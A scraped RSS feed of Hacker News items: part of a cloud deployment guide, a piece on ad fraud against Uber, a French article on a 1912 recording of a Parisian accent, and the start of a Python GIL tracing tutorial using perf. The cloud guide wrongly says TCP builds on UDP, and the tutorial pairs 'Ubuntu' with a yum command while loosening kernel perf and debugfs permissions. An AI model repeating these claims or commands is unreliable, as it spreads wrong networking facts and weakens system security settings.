again when we talk about more interesting deployment options.</p><p>Once we have an IP address, we log into the machine using SSH, install our code <em>package</em>, which can be as simple as a zip file for interpreted languages (like Ruby, Python or PHP), or a specially formatted zip file like <a href="https://en.wikipedia.org/wiki/JAR_(file_format)">JAR</a> or <a href="https://en.wikipedia.org/wiki/WAR_(file_format)">WAR</a> (Java &amp; JVM), or a compiled binary (Go, C++). We then complete the process of <em>deployment</em> by installing any dependencies or language runtimes we need, and run the application with a <a href="https://www.linux.com/training-tutorials/understanding-and-using-systemd/">process</a> <a href="http://smarden.org/runit/">manager</a> so it stays running after we log out or restart. </p><p>We can then point a domain name, like <em>www.example.com</em>, at the IP address of our server has using the <a href="https://en.wikipedia.org/wiki/Name_server">name-servers</a> provided by company that we registered the domain name with. Or we could use the DNS name-servers offered by the cloud providers, which promise better performance all over the world. AWS has <a href="https://aws.amazon.com/route53/">Route53</a> (named after the default port for a DNS name-server, which is 53), Google has <a href="https://cloud.google.com/dns">Cloud DNS</a> and Azure just has <a href="https://docs.microsoft.com/en-us/azure/dns/dns-overview">DNS</a>. Using the cloud providers is helpful because they've got servers deployed all over the word, and DNS speeds make a big difference in how fast your application works for users everywhere. Route53 has a few advantages here—besides just answering the question of which IP address is serving a particular domain name, it also gives you the option to tailor that answer based on where the user is, letting you send them to a deployment that's close to them. This assumes that you have a global application that's deployed in multiple places across the world, of course. <a href="https://www.cloudflare.com/">Cloudflare</a> is also an excellent DNS provider—they also have a deployment offering that we'll cover later.</p><p>Along with some extra work that I really hope you do, like OS firewalls and OS hardening, this completes a basic application server setup on the cloud. The cloud providers helpfully provide services to manage basic network security around your server, like AWS <a href="https://aws.amazon.com/vpc/">VPC</a>, Google <a href="https://cloud.google.com/vpc/docs/firewalls">VPC</a>, or Azure <a href="https://azure.microsoft.com/en-in/services/virtual-network/">Virtual Network</a>. All of these will allow you to selectively open and close ports with allow/block rules that be scoped to IP addresses; or scoped to another group of similarly managed servers (often called a <em>security group</em>). There are also pre-hardened cloud-specific OS distributions like <a href="https://aws.amazon.com/amazon-linux-2/">Amazon Linux</a> available for free use.</p><p>To see what's going on with your application, or <em>monitor</em> it, you could always log in to the machine and read, or <em>tail</em>, the logs. But there's another building block that cloud companies will give you—a tool to ingest logs, set up alerts and dashboards on them and archive them if necessary. AWS <a href="https://aws.amazon.com/cloudwatch/">CloudWatch</a>, Google <a href="https://cloud.google.com/logging">Cloud Logging</a>, and Azure <a href="https://docs.microsoft.com/en-us/azure/azure-monitor/overview">Monitor</a> all provide these features, usually charging based on the quantity of logs you ingest into them and how long you hold them for. Each of them have different features, but as a starting point it'll make sense to just use whatever is available with your chosen platform. Each platform's logging tool will usually also handle native metrics for you—you'll be able to make a dashboard of server CPU usage, disk utilization, or any other metric that the cloud provider tracks natively. If you need more than this, companies like <a href="https://www.datadoghq.com/">Datadog</a>, <a href="https://www.sumologic.com/">Sumo Logic</a>, <a href="https://newrelic.com/">New Relic</a>, <a href="https://www.elastic.co/what-is/elk-stack">Elastic</a> and many others can also help.</p><h2 id="protocols-encryption">Protocols &amp; Encryption</h2><p>Before move on to more complex deployments, it's important to review what kinds of incoming requests our applications might be dealing with in the first place. The common protocols we use are:</p><ul><li><strong>UDP</strong>, where <a href="https://en.wikipedia.org/wiki/User_Datagram_Protocol">packets</a> of information are sent to an IP address with no expectation of acknowledgement.</li><li><strong>TCP</strong>, which <a href="https://searchnetworking.techtarget.com/definition/TCP">builds</a> on <em>UDP</em> to create the concept of a <em>connection</em>, where the sender and receiver work with ordered packets of information that are all acknowledged—this gives the sender and receiver the impression of having a 2-way reliable sequential stream on which to exchange raw bytes.</li><li><strong>HTTP/1</strong>, which <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Evolution_of_HTTP">builds</a> on <em>TCP</em> to add the concept of a <em>request</em> and <em>response.</em> A <em>request</em> is sent to a human readable address, called a URL, with <em>headers</em> that act as key-value metadata and an optional <em>body</em> of bytes. Each request gets a response, with the same format of headers and body. Each request &amp; response runs on one TCP connection.</li><li><strong>WebSocket</strong>, which <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSocket"></a><a href="https://www.ably.io/topic/websockets">builds</a> on TCP to provide a similar 2-way ordered data stream, but instead of raw bytes the protocol allows for distinct messages to be sent. Each message is either received as a whole, or the connection is considered to have failed. WebSocket is a companion protocol to HTTP, and a HTTP connection is often transformed (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Protocol_upgrade_mechanism">technically</a> <em>upgraded</em>) into a WebSocket.</li><li><strong>HTTP/2</strong>, which builds on <em>TCP</em> and offers the same features as HTTP/1, <a href="https://www.digitalocean.com/community/tutorials/http-1-1-vs-http-2-what-s-the-difference">but with better</a> performance, connection <em>multiplexing</em> (more than one HTTP request-response exchanges can happen simultaneously on the same TCP connection), header compression, and preemptive data <a href="https://www.smashingmagazine.com/2017/04/guide-http2-server-push/">pushing</a> from the server.</li><li><strong>gRPC</strong>, which <a href="https://grpc.io/"></a><a href="https://grpc.io/docs/what-is-grpc/core-concepts/"></a><a href="https://grpc.io/docs/what-is-grpc/core-concepts/">builds</a> on <em>HTTP/2</em> to offer remote procedure calls—a way for clients to call functions on servers, identified by URI, with an input and output exchanged in predetermined binary formats.</li><li><strong>HTTP/3 + QUIC</strong>, which builds on <em>UDP</em> and offers the same features as HTTP/2 but <a href="https://blog.cloudflare.com/http3-the-past-present-and-future/"></a><a href="https://blog.cloudflare.com/http3-the-past-present-and-future/">better</a>.</li><li><strong>TLS/SSL</strong>, which isn't a standalone protocol, but a <a href="https://www.cloudflare.com/learning/ssl/what-happens-in-a-tls-handshake/">way to encrypt</a> and secure TCP and all the protocols that are built on it (which is all of them except …</li></ul></div></article></main></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sudhir.io/the-big-little-guide-to-running-code-in-the-clouds/">https://sudhir.io/the-big-little-guide-to-running-code-in-the-clouds/</a></em></p>]]>
            </description>
            <link>https://sudhir.io/the-big-little-guide-to-running-code-in-the-clouds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775783</guid>
            <pubDate>Thu, 14 Jan 2021 12:57:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How did Uber waste so much ad money?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25775613">thread link</a>) | @mektrik
<br/>
January 14, 2021 | https://mackgrenfell.com/blog/how-did-uber-waste-so-much-ad-money | <a href="https://web.archive.org/web/*/https://mackgrenfell.com/blog/how-did-uber-waste-so-much-ad-money">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Uber's ad troubles aren't recent news. As early as the start of 2020, there were stories coming out about how they'd realised they'd wasted huge multi-million dollar budgets on fraudulent ads.</p><p>For some reason, these stories only received limited attention at the time, and mostly just from within the marketing community. At the start of 2021 however <a href="https://twitter.com/nandoodles/status/1345774768746852353">they re-emerged</a>, and with that brought a whole new wave of people asking: <em>how did Uber waste that much ad spend?</em></p><figure id="w-node-5a52e94b4c30-192f161b"><p><img src="https://uploads-ssl.webflow.com/5e26e90f16b6d177e3ff36c6/5ff8af6b2e435e23d4fe5a75_Untitled.png" alt=""></p></figure><h2>What did Uber waste their budgets on?</h2><p>Uber wasted a significant proportion of their budgets that were spent on 3rd party advertising networks, sometimes referred to as <em>programmatic</em> advertising.</p><p>A 3rd party network allows advertisers to buy ad inventory on all sorts of websites and apps, that aren't affiliated with the network itself. An example of such a network that many are familiar with is Google AdSense. AdSense facilitates the buying of ads on a range of non-Google properties, even though it's owned and managed by Google.</p><p>3rd party networks contrast with more standard platforms like Facebook Ads, or Google Ads. Each of these platforms allows advertisers to buy ad space on properties that belong to the ad network (i.e. Facebook or Google).</p><p>This question of ownership, of who owns the property that the advertiser is buying ads on, will become important in understanding how ad fraud occurs.</p><h2>What is ad fraud?</h2><p><em>Ad fraud</em> is a collective term for a number of practices that attempt to fraudulently take advertising budgets from advertisers.</p><h3>Basic ad fraud</h3><p>A classic example of ad fraud is to sell fake impressions, where <em>impression</em> is advertiser-speak for an ad view. If you're running a website where you sell space via a 3rd party network, it might cross your mind that you could boost your ad revenues by generating fake impressions on your site. For example, by having bots visit your site and causing ads to load, thus generating incremental ad revenue for you.</p><p>This is a fairly simplistic form of ad fraud, and one that's relatively easy to detect. Common markers are high volumes of traffic coming from a certain IP, with certain browser characteristics (user-agents, screen sizes etc.).</p><p>Even when it's not detected though, it only really harms one sort of advertiser; an advertiser who is optimising to get the most impressions (or reach) possible for their budget.</p><p>If an advertiser isn't just concerned with impressions, but they also want to see people clicking on their ads, or going on to download their app after clicking on their ads (á la Uber) then in theory they're less likely to fall victim to ad fraud.</p><p>This is because the advertiser will either manually notice that traffic from the fraudulent site isn't converting how they want it to, or because they're running optimisation algorithms which'll shift spend away from that site when they notice its users aren't converting.</p><h3>Sophisticated ad fraud</h3><p>Unfortunately though, checking whether users who come through your ads end up downloading wasn't enough to save Uber.</p><p>As Kevin Frisch (Uber's ex-head of performance marketing and CRM) notes, they found cases where a user would click on an ad and be signed into Uber 2 seconds later. This is of course practically impossible, and suggests that these sites were using bots which could create and interact with Uber accounts to make it appear as if genuine users were coming from those sites.</p><p>This would in turn convince whichever marketing manager or algorithm that was monitoring Uber's spend to shift more budget to those sites, because they appeared to be generating real user interactions.</p><p>All of this wins the fraudulent sites more and more of Uber's ad spend, all the while leading to no actual revenue or upside for Uber.</p><h3>Countering ad fraud</h3><p>One way to counter ad fraud is to use revenue-driving events to determine how you spend your budget.</p><p>What I mean by this, in Uber's case, would be looking at how the different sites you placed ads on fared when it came to generating revenue-driving events, like rides booked. If a site brings you lots of new users, who all start booking rides with Uber, then there's likely little (if any) fraud on the site.</p><figure id="w-node-b60859aeb077-192f161b"><p><img src="https://uploads-ssl.webflow.com/5e26e90f16b6d177e3ff36c6/5ff8af7379a88562953682b1_Untitled.png" alt=""></p></figure><p>Fraudsters can't spoof this by creating bots which visit their site, download Uber, and start paying for rides. Well, they can, except the amount they spend on rides would have to exceed the ad revenue that their site is generating in order for Uber to want to continue advertising on that site.</p><p>So in this sense, optimising your ad delivery based on revenue-driving events greatly diminishes the chance of falling victim to ad fraud.</p><h3>Why didn't Uber do this?</h3><p>There are a couple of reasons why Uber may not have done this. One is that display advertising, which is where the fraud occurred, is what advertisers call <em>upper-funnel</em> marketing.</p><p>Upper-funnel marketing is good for driving awareness, and brand recognition, and maybe even installs. That said, upper-funnel marketing is generally less good at driving revenue in a short timeframe.</p><p>As such, Uber may have decided that they were going to optimise their display advertising solely based on installs, and not a lower-funnel action like rides booked, because they didn't expect to get much data for the latter.</p><figure id="w-node-f19409766f0e-192f161b"><p><img src="https://uploads-ssl.webflow.com/5e26e90f16b6d177e3ff36c6/5ff8af80e17726a106141537_Untitled.png" alt=""></p></figure><p>Uber may have effectively assumed that the percentage conversion rate from install to ride booked on these fraudulent display channels would be the same as on non-fraudulent channels, and so believed that they were getting a good deal if they could drive installs on a fraudulent channel at the same cost per install as a non-fraudulent channel. Of course if installs from a fraudulent channel never converted to rides booked (i.e. revenue), then this isn't an effective assumption.</p><h2>Cutting the fat</h2><p>The other thing Kevin Frisch said which I found interesting was:</p><ul role="list"><li><em>We turned off two thirds of our ad spend – $100m out of annual spend of $150m – and basically saw no change in our number of rider app installs. What we saw is a lot of installs we thought had come through paid channels suddenly came through organic.</em></li></ul><p>Straight off the bat it's interesting to note that total install volume stayed constant, while install source shifted in favour of organic. This naturally suggests that paid channels were over-attributing; marketing-speak for taking credit for installs that they didn't actually generate.</p><p>The other interesting thing is the suggestion of measuring the efficacy of paid channels by just turning them off.</p><h3>Measurement and timeframes</h3><p>If you're running paid channels where you expect a low latency between ad impression and conversion, then this is a perfectly valid way to measure the effectiveness of those channels. A great example of this sort of channel would be paid search; if you turn paid search off then (if it's being run well) you should expect conversion numbers to fall almost immediately.</p><p>The channels that Uber were running appear to be quite different to the paid search example; they appear to be primarily display and branding channels. Because brand-focused ads work over a much longer timeframe, be it months or years, you can't expect to see an immediate decrease in conversion volume when they're turned off.</p><p>If the conversion volume stays high, this could be because of the cumulative effect of all previous ads run. It might be that these ads built such a strong brand for Uber over such a long period of time, that Uber's conversion volume could keep growing organically even after the ads were turned off.</p><p>What this really all hinges on is how long Uber waited after turning off the ads before determining that there was &nbsp;<em>"no change in our number of rider app installs"</em>. I would assume Uber were smart enough to wait a good period of time (at least 6 months) before determining this. If Uber simply waited a month, that may well not have been long enough to determine the long term impact of pulling ad spend.</p><h3>Marginal cost per install</h3><p>The other point it's worth considering is that Frisch says Uber <em>basically saw no change in [Uber's] number of rider app installs</em>. The <em>basically</em> implies that there was likely some change, albeit a very insignificant change in comparison to the reduction in spend.</p><p>What's worth noting here is that you don't have to be buying dodgy ads to notice this sort of behaviour, where a huge drop in spend has nearly no impact on volume. The reason for this is that many advertisers unknowingly have incredibly high marginal efficiency metrics, such as marginal cost per install in Uber's case.</p><p>This comes about because you're saturating a market so heavily that, while the cost of 90% of your installs might be low, the cost of getting those last 10% is incredibly high. The cost to get one additional install is your <em>marginal cost per install</em>, and it's a metric few advertisers know how to track.</p><p>Because advertisers don't typically focus on marginal efficiency metrics, they can often grow to extraordinary values, to the point where a marginal cost per install could be 10x a brand's average cost per install. Advertisers in this position can stand to save huge amounts of ad spend, whilst only losing a small amount of volume, just by pulling back their budgets.</p><p>I have no proof whatsoever that this was a determining factor in what Uber noticed, but I'd wager it likely played some part. It's hard to imagine that a brand like Uber, spending $150 million a year, didn't have sky-high marginal costs per install.</p><h2>In summary</h2><p>Uber wasted a whole bunch of cash. This primarily came because of ad fraud, and the fact that Uber likely weren't monitoring their revenue-driving events closely enough to notice that some (fraudulent) sites weren't driving these events.</p><p>Uber's approach of just turning off 2/3rds of their spend is a good way to understand it's impact, but only if you wait long enough to really see the impact of that reduced spend. Uber likely also benefitted from pulling back because their marginal efficiency metrics were so high.</p><p>‍</p></div></div></div>]]>
            </description>
            <link>https://mackgrenfell.com/blog/how-did-uber-waste-so-much-ad-money</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775613</guid>
            <pubDate>Thu, 14 Jan 2021 12:34:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Parisian Accent in 1912]]>
            </title>
            <description>
<![CDATA[
Score 297 | Comments 154 (<a href="https://news.ycombinator.com/item?id=25775091">thread link</a>) | @paganel
<br/>
January 14, 2021 | https://www.franceculture.fr/sciences-du-langage/archive-exceptionnelle-ecoutez-laccent-parisien-en-1912 | <a href="https://web.archive.org/web/*/https://www.franceculture.fr/sciences-du-langage/archive-exceptionnelle-ecoutez-laccent-parisien-en-1912">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>"C’est extraordinaire que j’aie une voix aussi traînarde, jamais je l’aurais cru ! On ne s’entend pas, absolument !" Dans ce document unique en son genre, un Parisien réagit à l'écoute de son propre accent, celui du 14e arrondissement, en 1912. Il est interviewé par le linguiste Ferdinand Brunot. </p><div>
            <p>Cette archive exceptionnelle est l’une des premières interviews sonores, le premier enregistrement d'un échange spontané, non lu. C’est aussi l’une des rares traces de l’accent parisien d’avant-guerre. En 1912, le linguiste Ferdinand Brunot veut enregistrer les dialectes des artisans. Ici, c’est le parler parisien qui l’intéresse, l’accent populaire des différents quartiers de la capitale. Louis Ligabue, tapissier dans le 14e arrondissement, a alors 37 ans, et note déjà l'embourgeoisement de son quartier.</p>

<h2>Le parler d'un pur "Parisien de Paris"</h2>
<p>Le linguiste Ferdinand Brunot, fondateur des "Archives de la parole"&nbsp;en 1911, est l'un des rares universitaires de son temps à s'intéresser à l'enregistrement du français parlé&nbsp;"commun". Pour lui, le "parler parisien" est une forme de dialecte dont il faut garder la trace. Chaque quartier de la capitale est censé présenter ses spécificités linguistiques&nbsp;: on ne parle pas à Montrouge comme à Montmartre. Or pour <a target="_blank" rel="noopener" href="https://gallica.bnf.fr/blog/11052020/quand-un-parisien-entend-pour-la-premiere-fois-le-son-de-sa-voix?mode=desktop">Pascal Cordereix</a>, responsable du service des documents sonores à la BnF, "<em>ce 'dialecte' parisien renvoie lui-même à l’un des plus grands mythes de la linguistique romane parisienne de la fin du XIXe siècle, à savoir le "françien", un supposé dialecte d’Île-de-France dans lequel le français trouverait sa seule origine. On est là au cœur de la construction jacobine de la langue française mise en œuvre après 1870, opposant définitivement français et autres idiomes parlés sur le territoire.</em>"</p>
<p><em>Ferdinand Brunot interviewe Louis Ligabue en 1912&nbsp;:&nbsp;</em></p>


<p>- Vous êtes vraiment, vous monsieur, un Parisien de Paris&nbsp;?&nbsp;</p>
<p><em>-</em> Je suis né à Paris même, boulevard Sébastopol et j’ai monté du côté de Montrouge, rue Daguerre. Ensuite, j’ai été avenue d’Orléans. J’ai travaillé dans le quartier constamment. Je ne l’ai jamais quitté du reste.&nbsp;</p>
<p>- Et vous êtes exclusivement tapissier, alors&nbsp;?&nbsp;</p>
<p>- Absolument. (...) et je travaille pour le client personnel (...)</p>
<p>- Vous êtes exclusivement dans la clientèle bourgeoise&nbsp;?&nbsp;</p>
<p>- Oui, monsieur.</p>
<p>- Il y a eu beaucoup d’installations de ce côté-là, ce doit être un bon métier&nbsp;?</p>
<p><em>-</em> Ah le quartier a beaucoup gagné. Nous avons depuis quelques années travaillé admirablement.</p>
<p>- J’ai entendu dire que vous n’étiez pas payé très régulièrement...</p>
<p>- Oh vous savez, le 14e est tout à fait spécial. Nous avons de bons clients, de bons bourgeois, et puis régulièrement, on hésite à donner une affaire... Mais quant au règlement, jamais nous ne perdons quoi que ce soit.&nbsp;</p>
<p>- On m’avait dit au contraire que rue Alphonse Daudet, il y avait une clientèle peu recommandable...</p>
<p>- Ah dame ! Ça, je m’en réjouis bien !</p>
<h2>Entendre sa propre voix</h2>
<p>Ce document est unique à plus d'un titre&nbsp;: c’est aussi la première fois qu’on entend quelqu’un réagir à ses propos, à sa voix. &nbsp;Dans la foulée de l’interview, Louis Ligabue s’écoute, et s’étonne, toujours en dialoguant avec le linguiste Ferdinand Brunot. <a target="_blank" rel="noopener" href="https://gallica.bnf.fr/blog/11052020/quand-un-parisien-entend-pour-la-premiere-fois-le-son-de-sa-voix?mode=desktop">Pascal Cordereix</a>, spécialiste du fonds sonore ancien à la Bibliothèque nationale de France (BnF)&nbsp;: "<em>On connaît beaucoup de récits écrits d’un enregistrement et de la surprise du locuteur s’écoutant parler. Mais à notre connaissance, Ferdinand Brunot est le seul, avant longtemps, à avoir l’idée de graver ainsi sur disque les réactions du témoin à l’écoute de sa propre voix.</em>"</p>
<p><strong>Ferdinand Brunot interviewe Louis Ligabue en 1912&nbsp;:&nbsp;</strong></p>
<p>- Eh bien, vous avez entendu ce que vous avez dit. Vous êtes-vous reconnu&nbsp;?&nbsp;</p>
<p>- Oui, parfaitement monsieur !</p>
<p>- N’est-ce pas que c’est bien votre voix&nbsp;?&nbsp;</p>
<p>- C’est parfait, parfait, c’est même très très curieux ! C’est très drôle, il me semble même que c’est extraordinaire que j’aie une voix si traînarde, jamais je ne l’aurais cru ! On ne s’entend pas, absolument !&nbsp;</p>
<p>- Vous n’avez pas la voix traînarde, vous avez tout simplement l’accent de Paris, c’est justement ça que je veux enregistrer.&nbsp;</p>
<p>- Ah ça aujourd'hui j’en suis convaincu, bien des gens m’ont dit des fois&nbsp;: “Comme il traîne ce garçon dans sa conversation”. Ben, je disais non, pourtant, il me semble que c’est tout naturel&nbsp;; mais alors là, vous savez, j’ai un accent presque d’La Villette on dirait…</p>
<p>- La Villette&nbsp;? Ne croyez-vous pas qu’il y a une grande différence justement entre l’accent de La Villette et le vôtre&nbsp;?</p>
<p>- Ah peut-être, je ne sais pas…</p>
<p>- Vous qui êtes de Paris, est-ce que vous ne reconnaissez pas justement quelqu’un qui est de nos arrondissements&nbsp;?</p>
<p>- Ah absolument, si, il y a réellement des différences.</p>
<p>- Quelqu’un qui s’est beaucoup occupé de ça me disait par exemple qu’il reconnaissait du premier coup un habitant du 14e et un habitant de Montmartre.</p>
<p>- Ah peut-être, mais enfin, il me semble que c’est une étude assez sérieuse.</p>
<p>- Oui, il y a des gars qui imitent ça étonnamment et à volonté vous savez, ils se transforment en gens de Montparnasse, ou en gens de Montmartre comme ils veulent.</p>
<p>- Ah oui, on voit ça dans les revues, là, dans les concerts, là&nbsp;; on a des types spéciaux là-dessus.</p>
<p>- Oui. Est-ce que dans la rue de la Gaîté, là, il y a des gens qui imitent justement l’accent du quartier&nbsp;?</p>
<p>- Ah y en a, y en a. Mais alors, ça devient peut-être un peu en exagération. Tandis que là, moi, je cause naturellement, et quand j’écoute, il me semble que j’exagère… Je suis bien content, vous savez, d’avoir jugé et ça m’a bien intéressé !</p>
<p>- Et bien je vous remercie de vous être prêté à l’expérience.</p>
<p>- De rien.</p>
<h2>Les Archives de la parole à découvrir sur Gallica</h2>
<p>Archive conservée à la Bibliothèque nationale de France. Merci au service Son du département de l’Audiovisuel, BnF et au Service de la coopération numérique et de Gallica, BnF. Archives de la Parole, conservation&nbsp;: BnF, Département de l’Audiovisuel, service Son.</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://gallica.bnf.fr/html/und/enregistrements-sonores/archives-de-la-parole-ferdinand-brunot-1911-1914">Les Archives de la parole, 1911-1914</a></li>
<li><a target="_blank" rel="noopener" href="https://gallica.bnf.fr/html/und/enregistrements-sonores/archives-de-la-parole-jean-poirot-enregistrements-la-sorbonne">Les Archives de la parole, 1920-1924</a></li>
<li><a target="_blank" rel="noopener" href="https://gallica.bnf.fr/html/und/enregistrements-sonores/archives-de-la-parole-musee-de-la-parole-et-du-geste-hubert-pernot-1924-1930">Les Archives de la parole, 1924-1930</a></li>
</ul>



    </div></div>]]>
            </description>
            <link>https://www.franceculture.fr/sciences-du-langage/archive-exceptionnelle-ecoutez-laccent-parisien-en-1912</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775091</guid>
            <pubDate>Thu, 14 Jan 2021 11:26:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracing and visualizing the Python GIL with perf and VizTracer]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25774945">thread link</a>) | @maartenbreddels
<br/>
January 14, 2021 | https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html | <a href="https://web.archive.org/web/*/https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div>

<p>There are plenty of articles explaining why the Python GIL (The Global Interpreter Lock) exists<sup id="fnref-1"><a href="#fn-1">1</a></sup>, and why it is there. The TLDR version is: the GIL prevents multithreaded pure Python code from using multiple CPU cores.</p>
<p>However, in <a href="https://vaex.io/">Vaex</a> we execute most of the CPU intensive parts in C (C++) code, where we release the GIL. This is a common practice in high-performance Python libraries, where Python acts merely as a high-level glue.</p>
<p>However, the GIL needs to be released explicitly, and this is the responsibility of the programmer and might be forgotten, leading to suboptimal use of your machine.</p>
<p>I recently had this issue in <a href="https://github.com/vaexio/vaex/pull/1114">Vaex</a> where I simply forgot to release the GIL and found a similar issue in <a href="https://github.com/apache/arrow/pull/7756">Apache Arrow</a><sup id="fnref-2"><a href="#fn-2">2</a></sup>.</p>
<p>Also, when running on 64 cores, I sometimes see a performance in Vaex that I am not happy with. It might be using 4000% CPU, instead of 6400% CPU, which is something I am not happy with. Instead of blindly pulling some levers to inspect the effect, I want to understand what is happening, and if the GIL is the problem, why, and where is it holding Vaex down.</p>


</div>
</div>
</div><div>
<div>
<div>

<p>I'm planning to write a series of articles explaining some tools and techniques available for profiling/tracing Python together with native extensions, and how these tools can be glued together, to analyze and visualize what Python is doing, and when the GIL it taken or dropped.</p>
<p>I hope this leads to improvement of tracing, profiling, and other performance tooling in the Python ecosystem, and the performance of the whole Python ecosystem.</p>

<h2 id="Linux">
Linux<a href="#Linux"> </a>
</h2>
<p>Get access to a Linux machine, and make sure you have root privileges (sudo is fine), or ask your sysadmin to execute some of these commands for you. For the rest of the document, we only run as user.</p>
<h2 id="Perf">
Perf<a href="#Perf"> </a>
</h2>
<p>Make sure you have perf installed, e.g. on Ubuntu:</p>

<pre><code>$ sudo yum install perf</code></pre>
<h2 id="Kernel-configuration">
Kernel configuration<a href="#Kernel-configuration"> </a>
</h2>
<p>To enable running it as a user:</p>

<pre><code># Enable users to run perf (use at own risk)
$ sudo sysctl kernel.perf_event_paranoid=-1

# Enable users to see schedule trace events:
$ sudo mount -o remount,mode=755 /sys/kernel/debug
$ sudo mount -o remount,mode=755 /sys/kernel/debug/tracing</code></pre>
<h2 id="Python-packages">
Python packages<a href="#Python-packages"> </a>
</h2>
<p>We will make use of <a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a> and <a href="https://github.com/maartenbreddels/per4m">per4m</a></p>

<pre><code>$ pip install "viztracer&gt;=0.11.2" "per4m&gt;=0.1,&lt;0.2"</code></pre>

</div>
</div>
</div><div>
<div>
<div>

<p>There is no way to get the GIL state in Python <sup id="fnref-3"><a href="#fn-3">1</a></sup> since there is no API for this. We can track it from the kernel, and the right tool for this under Linux is <strong>perf</strong>.</p>
<p>Using the linux perf tool (aka perf_events), we can listen to the state changes for processes/threads (we only care about sleeping and running), and log them. Although perf may look scary, it is a powerful tool. If you want to know a bit more about perf, I recommend reading <a href="https://jvns.ca/blog/2018/04/16/new-perf-zine/">Julia Evans' zine on perf</a> or <a href="http://www.brendangregg.com/perf.html">go through Brendan Gregg's website</a>.</p>
<p>To build our intuition, we will first run perf on a <a href="https://github.com/maartenbreddels/per4m/blob/master/per4m/example0.py">very trivial program</a>:</p>


</div>
</div>
</div><div>
<div>
<div>
<p>We listen to just a few events to keep the noise down (note the use of wildcards):</p>

<pre><code>$ perf record -e sched:sched_switch  -e sched:sched_process_fork \
        -e 'sched:sched_wak*' -- python -m per4m.example0
[ perf record: Woken up 2 times to write data ]
[ perf record: Captured and wrote 0,032 MB perf.data (33 samples) ]</code></pre>
<p>And use the <code>perf script</code> command to write human/parsable output.</p>

<pre><code>$ perf script
        :3040108 3040108 [032] 5563910.979408:                sched:sched_waking: comm=perf pid=3040114 prio=120 target_cpu=031
        :3040108 3040108 [032] 5563910.979431:                sched:sched_wakeup: comm=perf pid=3040114 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995616:                sched:sched_waking: comm=kworker/31:1 pid=2502104 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995618:                sched:sched_wakeup: comm=kworker/31:1 pid=2502104 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995621:                sched:sched_waking: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995622:                sched:sched_wakeup: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995624:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=R+ ==&gt; next_comm=kworker/31:1 next_pid=2502104 next_prio=120
          python 3040114 [031] 5563911.003612:                sched:sched_waking: comm=kworker/32:1 pid=2467833 prio=120 target_cpu=032
          python 3040114 [031] 5563911.003614:                sched:sched_wakeup: comm=kworker/32:1 pid=2467833 prio=120 target_cpu=032
          python 3040114 [031] 5563911.083609:                sched:sched_waking: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563911.083612:                sched:sched_wakeup: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563911.083613:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=R ==&gt; next_comm=ksoftirqd/31 next_pid=198 next_prio=120
          python 3040114 [031] 5563911.108984:                sched:sched_waking: comm=node pid=2446812 prio=120 target_cpu=045
          python 3040114 [031] 5563911.109059:                sched:sched_waking: comm=node pid=2446812 prio=120 target_cpu=045
          python 3040114 [031] 5563911.112250:          sched:sched_process_fork: comm=python pid=3040114 child_comm=python child_pid=3040116
          python 3040114 [031] 5563911.112260:            sched:sched_wakeup_new: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040114 [031] 5563911.112262:            sched:sched_wakeup_new: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040114 [031] 5563911.112273:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
          python 3040116 [037] 5563911.112418:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112450:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112473: sched:sched_wake_idle_without_ipi: cpu=31
         swapper     0 [031] 5563911.112476:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040114 [031] 5563911.112485:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
          python 3040116 [037] 5563911.112485:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112489:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112496:                sched:sched_switch: prev_comm=python prev_pid=3040116 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/37 next_pid=0 next_prio=120
         swapper     0 [031] 5563911.112497:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031
